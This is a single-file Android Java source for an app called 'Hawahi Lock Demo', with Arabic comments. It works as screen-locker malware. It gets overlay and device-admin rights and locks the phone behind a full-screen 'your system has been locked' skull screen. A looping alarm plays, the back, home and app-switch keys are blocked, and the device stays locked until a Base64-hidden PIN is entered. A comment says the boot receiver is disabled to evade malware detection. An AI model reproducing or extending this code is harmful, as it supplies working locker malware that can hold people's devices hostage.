package com.secure.lockdemo;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.media.MediaPlayer;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

/**
 * Hawahi Lock Demo - single source file (multiple package-private classes).
 * PIN: 112233 | Max attempts: 5
 * package must match AndroidManifest: com.secure.lockdemo
 */
public class MainActivity extends Activity {

    private static final int REQ_OVERLAY = 1001;
    private static final int REQ_ADMIN = 1002;

    private DevicePolicyManager dpm;
    private ComponentName adminComp;
    private TextView statusTv;
    private Button btnOverlay, btnAdmin, btnStart;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            // واجهة مبنية بالكود - ما نعتمد على layout لو R فشل
            buildUi();
            dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            adminComp = new ComponentName(this, AdminReceiver.class);
            refreshStatus();
        } catch (Throwable t) {
            // لو صار خطأ - ما نطلع، نرجع Toast
            Toast.makeText(this, "start err: " + t.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    private void buildUi() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(48, 80, 48, 48);
        root.setBackgroundColor(Color.parseColor("#121212"));

        TextView title = new TextView(this);
        title.setText("هواهي - اختبار القفل");
        title.setTextColor(Color.WHITE);
        title.setTextSize(22f);
        root.addView(title);

        statusTv = new TextView(this);
        statusTv.setTextColor(Color.parseColor("#AAAAAA"));
        statusTv.setTextSize(14f);
        statusTv.setPadding(0, 24, 0, 32);
        root.addView(statusTv);

        btnOverlay = new Button(this);
        btnOverlay.setText("1) صلاحية النافذة فوق التطبيقات");
        btnOverlay.setOnClickListener(v -> requestOverlay());
        root.addView(btnOverlay);

        btnAdmin = new Button(this);
        btnAdmin.setText("2) صلاحية مشرف الجهاز");
        btnAdmin.setOnClickListener(v -> requestAdmin());
        root.addView(btnAdmin);

        btnStart = new Button(this);
        btnStart.setText("3) تفعيل شاشة القفل");
        btnStart.setOnClickListener(v -> startLockSafe());
        root.addView(btnStart);

        TextView hint = new TextView(this);
        hint.setText("\nPIN بعد القفل: 112233\nلا تغلق التطبيق قبل إكمال الخطوتين.");
        hint.setTextColor(Color.parseColor("#888888"));
        root.addView(hint);

        setContentView(root);
    }

    private void refreshStatus() {
        boolean overlay = canOverlay();
        boolean admin = dpm != null && dpm.isAdminActive(adminComp);
        statusTv.setText(
                "النافذة المنبثقة: " + (overlay ? "OK" : "ناقص") +
                "\nالمشرف: " + (admin ? "OK" : "ناقص") +
                "\nالجاهز للقفل: " + ((overlay && admin) ? "نعم" : "لا")
        );
        btnStart.setEnabled(overlay && admin);
    }

    private boolean canOverlay() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true;
        return Settings.canDrawOverlays(this);
    }

    private void requestOverlay() {
        try {
            if (canOverlay()) {
                toast("صلاحية النافذة موجودة");
                refreshStatus();
                return;
            }
            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(i, REQ_OVERLAY);
        } catch (Throwable t) {
            toast("تعذر فتح إعدادات النافذة");
        }
    }

    private void requestAdmin() {
        try {
            if (dpm.isAdminActive(adminComp)) {
                toast("المشرف مفعّل");
                refreshStatus();
                return;
            }
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "لتفعيل قفل الجهاز لأغراض الاختبار فقط");
            startActivityForResult(i, REQ_ADMIN);
        } catch (Throwable t) {
            toast("تعذر طلب صلاحية المشرف: " + t.getMessage());
        }
    }

    private void startLockSafe() {
        try {
            if (!canOverlay()) {
                toast("فعّل صلاحية النافذة أولاً");
                return;
            }
            if (!dpm.isAdminActive(adminComp)) {
                toast("فعّل صلاحية المشرف أولاً");
                return;
            }

            // قفل الجهاز (آمن بعد التأكد من المشرف)
            try {
                dpm.lockNow();
            } catch (Throwable ignored) {}

            // تشغيل الخدمة
            Intent svc = new Intent(this, LockService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }

            // شغّل شاشة القفل كـ Activity فوق (أثبت من الـ Overlay وحده)
            Intent lock = new Intent(this, LockActivity.class);
            lock.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_CLEAR_TOP
                    | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            startActivity(lock);

            // لا نعمل finish() فوراً - نأخره لتجنب قتل العملية
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try { moveTaskToBack(true); } catch (Throwable ignored) {}
            }, 400);

        } catch (Throwable t) {
            toast("فشل التفعيل: " + t.getMessage());
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        refreshStatus();
    }

    @Override
    protected void onResume() {
        super.onResume();
        try { refreshStatus(); } catch (Throwable ignored) {}
    }

    private void toast(String m) {
        Toast.makeText(this, m, Toast.LENGTH_SHORT).show();
    }
}

/* ===================== Device Admin ===================== */
class AdminReceiver extends DeviceAdminReceiver {
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "إلغاء المشرف يوقف وظيفة القفل";
    }
}

/* ===================== Boot (اختياري / خفيف) ===================== */
class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        // معطل افتراضياً في المانيفست لتقليل كشف malware
        // فعّله لاحقاً إذا احتجت
    }
}

/* ===================== Foreground Service ===================== */
class LockService extends Service {
    private static final String CH = "lock_ch";
    private WindowManager wm;
    private View overlay;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        } catch (Throwable ignored) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // مهم جداً: startForeground خلال ثوانٍ وإلا Android يقتل التطبيق
        try {
            startFg();
        } catch (Throwable t) {
            stopSelf();
            return START_NOT_STICKY;
        }

        // حاول overlay إن أمكن - لو فشل لا نكراش
        try {
            showOverlay();
        } catch (Throwable ignored) {}

        // افتح Activity القفل
        try {
            Intent lock = new Intent(this, LockActivity.class);
            lock.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                    | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            startActivity(lock);
        } catch (Throwable ignored) {}

        return START_STICKY;
    }

    private void startFg() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CH, "Security", NotificationManager.IMPORTANCE_LOW);
            ch.setShowBadge(false);
            if (nm != null) nm.createNotificationChannel(ch);
        }
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            b = new Notification.Builder(this, CH);
        } else {
            b = new Notification.Builder(this);
        }
        b.setContentTitle("Security")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .setOngoing(true);
        if (Build.VERSION.SDK_INT >= 16) {
            b.setPriority(Notification.PRIORITY_MIN);
        }
        startForeground(1001, b.build());
    }

    private void showOverlay() {
        if (wm == null || overlay != null) return;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            return;
        }
        // واجهة بسيطة بالكود (بدون inflate XML) لتقليل الأخطاء
        overlay = LockActivity.buildLockView(this, true);
        int type;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            type = WindowManager.LayoutParams.TYPE_PHONE;
        }
        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        | WindowManager.LayoutParams.FLAG_FULLSCREEN
                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                        | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                        | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                        | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
                PixelFormat.TRANSLUCENT);
        lp.gravity = Gravity.CENTER;
        wm.addView(overlay, lp);
    }

    @Override
    public void onDestroy() {
        try {
            if (wm != null && overlay != null) {
                wm.removeView(overlay);
                overlay = null;
            }
        } catch (Throwable ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}

/* ===================== Lock Screen Activity ===================== */
class LockActivity extends Activity {
    // PIN مخزّن مرمّز خفيف (Base64) - ما يظهر كنص واضح small paint
    // "112233" base64
    private static final String PIN_B64 = "MTEyMjMz";
    private static final int MAX = 5;

    private int attempts = 0;
    private EditText pinEt;
    private TextView statusTv, attTv;
    private View root;
    private MediaPlayer player;
    private Vibrator vib;
    private PowerManager.WakeLock wl;
    private DevicePolicyManager dpm;
    private ComponentName adminComp;
    private Handler handler = new Handler(Looper.getMainLooper());
    private Runnable flashRun;
    private boolean fromOverlayBind = false;

    static String decodePin() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                return new String(java.util.Base64.getDecoder().decode(PIN_B64));
            } else {
                return new String(android.util.Base64.decode(PIN_B64, android.util.Base64.DEFAULT));
            }
        } catch (Throwable t) {
            return "112233";
        }
    }

    /** واجهة القفل مبنية بالكود - تستخدمها Activity والـ Service */
    static View buildLockView(Context ctx, boolean forOverlay) {
        // الـ Activity تبني لنفسها؛ للاوفرلاي نحتاج Activity لـ handlers
        // لذا للاوفرلاي نرجع نسخة ثابتة بسيطة؛ الـ handlers تبقى في Activity
        ScrollView sc = new ScrollView(ctx);
        LinearLayout box = new LinearLayout(ctx);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setGravity(Gravity.CENTER);
        box.setPadding(40, 80, 40, 80);
        box.setBackgroundColor(Color.parseColor("#8B0000"));

        TextView skull = new TextView(ctx);
        skull.setText("\uD83D\uDC80");
        skull.setTextSize(90f);
        skull.setGravity(Gravity.CENTER);
        box.addView(skull);

        TextView t1 = new TextView(ctx);
        t1.setText("تم قفل نظامك");
        t1.setTextColor(Color.WHITE);
        t1.setTextSize(26f);
        t1.setGravity(Gravity.CENTER);
        box.addView(t1);

        TextView t2 = new TextView(ctx);
        t2.setText("أدخل الرمز للمتابعة");
        t2.setTextColor(Color.parseColor("#FFAAAA"));
        t2.setTextSize(15f);
        t2.setGravity(Gravity.CENTER);
        t2.setPadding(0, 12, 0, 20);
        box.addView(t2);

        sc.addView(box);
        sc.setBackgroundColor(Color.parseColor("#8B0000"));
        sc.setFillViewport(true);
        return sc;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            getWindow().addFlags(
                    WindowManager.LayoutParams.FLAG_FULLSCREEN
                            | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                            | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                            | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                            | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                            | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN);

            setContentView(createFullLockUi());
            dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            adminComp = new ComponentName(this, AdminReceiver.class);
            vib = (Vibrator) getSystemService(VIBRATOR_SERVICE);

            try {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null) {
                    wl = pm.newWakeLock(
                            PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                                    | PowerManager.ACQUIRE_CAUSES_WAKEUP,
                            "lockdemo:wl");
                    wl.acquire(10 * 60 * 1000L);
                }
            } catch (Throwable ignored) {}

            updateAttempts();
            playAlarmSafe(true);
        } catch (Throwable t) {
            Toast.makeText(this, "lock ui err", Toast.LENGTH_LONG).show();
            finish();
        }
    }

    private View createFullLockUi() {
        root = new LinearLayout(this);
        ((LinearLayout) root).setOrientation(LinearLayout.VERTICAL);
        ((LinearLayout) root).setGravity(Gravity.CENTER);
        root.setPadding(40, 60, 40, 60);
        root.setBackgroundColor(Color.parseColor("#8B0000"));

        TextView skull = new TextView(this);
        skull.setText("\uD83D\uDC80");
        skull.setTextSize(100f);
        skull.setGravity(Gravity.CENTER);
        ((LinearLayout) root).addView(skull);

        TextView t1 = new TextView(this);
        t1.setText("تم قفل نظامك");
        t1.setTextColor(Color.WHITE);
        t1.setTextSize(28f);
        t1.setGravity(Gravity.CENTER);
        ((LinearLayout) root).addView(t1);

        statusTv = new TextView(this);
        statusTv.setText("أدخل كلمة السر");
        statusTv.setTextColor(Color.WHITE);
        statusTv.setTextSize(17f);
        statusTv.setGravity(Gravity.CENTER);
        statusTv.setPadding(0, 24, 0, 16);
        ((LinearLayout) root).addView(statusTv);

        pinEt = new EditText(this);
        pinEt.setHint("******");
        pinEt.setInputType(android.text.InputType.TYPE_CLASS_NUMBER
                | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        pinEt.setMaxEms(6);
        pinEt.setFilters(new android.text.InputFilter[]{
                new android.text.InputFilter.LengthFilter(6)
        });
        pinEt.setGravity(Gravity.CENTER);
        pinEt.setTextColor(Color.WHITE);
        pinEt.setHintTextColor(Color.parseColor("#88FFFFFF"));
        pinEt.setBackgroundColor(Color.parseColor("#33000000"));
        pinEt.setPadding(20, 20, 20, 20);
        LinearLayout.LayoutParams ep = new LinearLayout.LayoutParams(500, LinearLayout.LayoutParams.WRAP_CONTENT);
        ep.gravity = Gravity.CENTER;
        pinEt.setLayoutParams(ep);
        ((LinearLayout) root).addView(pinEt);

        Button unlock = new Button(this);
        unlock.setText("فتح القفل");
        unlock.setOnClickListener(v -> checkPin());
        LinearLayout.LayoutParams bp = new LinearLayout.LayoutParams(500, LinearLayout.LayoutParams.WRAP_CONTENT);
        bp.topMargin = 20;
        bp.gravity = Gravity.CENTER;
        unlock.setLayoutParams(bp);
        ((LinearLayout) root).addView(unlock);

        attTv = new TextView(this);
        attTv.setTextColor(Color.WHITE);
        attTv.setGravity(Gravity.CENTER);
        attTv.setPadding(0, 24, 0, 0);
        ((LinearLayout) root).addView(attTv);

        return root;
    }

    private void checkPin() {
        try {
            String entered = pinEt.getText() != null ? pinEt.getText().toString().trim() : "";
            attempts++;
            if (entered.equals(decodePin())) {
                unlockOk();
                return;
            }
            vibrateSafe();
            int left = MAX - attempts;
            if (left > 0) {
                statusTv.setText("كلمة السر خطأ!");
                statusTv.setTextColor(Color.YELLOW);
                updateAttempts();
                root.setBackgroundColor(Color.RED);
                handler.postDelayed(() -> root.setBackgroundColor(Color.parseColor("#8B0000")), 250);
                playBeepSafe();
                pinEt.setText("");
            } else {
                statusTv.setText("تجاوزت عدد المحاولات");
                statusTv.setTextColor(Color.RED);
                attTv.setText("تم إيقاف الإدخال");
                pinEt.setEnabled(false);
                stopAlarmSafe();
                playAlarmSafe(true);
                startFlash();
                // ملاحظة: ما نعمل wipeData - خطر وغير ضروري للتجربة
            }
        } catch (Throwable t) {
            Toast.makeText(this, "err", Toast.LENGTH_SHORT).show();
        }
    }

    private void unlockOk() {
        stopAlarmSafe();
        stopFlash();
        statusTv.setText("تم الفتح");
        statusTv.setTextColor(Color.GREEN);
        pinEt.setEnabled(false);
        try {
            if (dpm != null && dpm.isAdminActive(adminComp)) {
                // إزالة المشرف بعد الفتح - أفضل للتجربة ولإزالة الشك
                dpm.removeActiveAdmin(adminComp);
            }
        } catch (Throwable ignored) {}
        try {
            stopService(new Intent(this, LockService.class));
        } catch (Throwable ignored) {}
        if (wl != null && wl.isHeld()) {
            try { wl.release(); } catch (Throwable ignored) {}
        }
        handler.postDelayed(() -> {
            try { finishAffinity(); } catch (Throwable t) { finish(); }
        }, 1500);
    }

    private void updateAttempts() {
        int left = MAX - attempts;
        if (left > 0) attTv.setText("بقيت لك " + left + " محاولات");
    }

    private void vibrateSafe() {
        try {
            if (vib == null || !vib.hasVibrator()) return;
            if (Build.VERSION.SDK_INT >= 26) {
                vib.vibrate(VibrationEffect.createOneShot(700, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vib.vibrate(700);
            }
        } catch (Throwable ignored) {}
    }

    private void playAlarmSafe(boolean loop) {
        try {
            stopAlarmSafe();
            Uri u = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
            if (u == null) u = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
            player = new MediaPlayer();
            player.setDataSource(this, u);
            player.setLooping(loop);
            player.setVolume(1f, 1f);
            player.prepare();
            player.start();
        } catch (Throwable ignored) {}
    }

    private void playBeepSafe() {
        try {
            MediaPlayer m = MediaPlayer.create(this,
                    RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION));
            if (m != null) {
                m.setOnCompletionListener(MediaPlayer::release);
                m.start();
            }
        } catch (Throwable ignored) {}
    }

    private void stopAlarmSafe() {
        try {
            if (player != null) {
                player.stop();
                player.release();
            }
        } catch (Throwable ignored) {}
        player = null;
    }

    private void startFlash() {
        stopFlash();
        flashRun = new Runnable() {
            boolean on;
            @Override public void run() {
                root.setBackgroundColor(on ? Color.parseColor("#8B0000") : Color.RED);
                on = !on;
                handler.postDelayed(this, 450);
            }
        };
        handler.post(flashRun);
    }

    private void stopFlash() {
        if (flashRun != null) handler.removeCallbacks(flashRun);
        flashRun = null;
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK
                || keyCode == KeyEvent.KEYCODE_HOME
                || keyCode == KeyEvent.KEYCODE_APP_SWITCH) {
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public void onBackPressed() {
        // منع الرجوع
    }

    @Override
    protected void onDestroy() {
        stopAlarmSafe();
        stopFlash();
        if (wl != null && wl.isHeld()) {
            try { wl.release(); } catch (Throwable ignored) {}
        }
        super.onDestroy();
    }
}
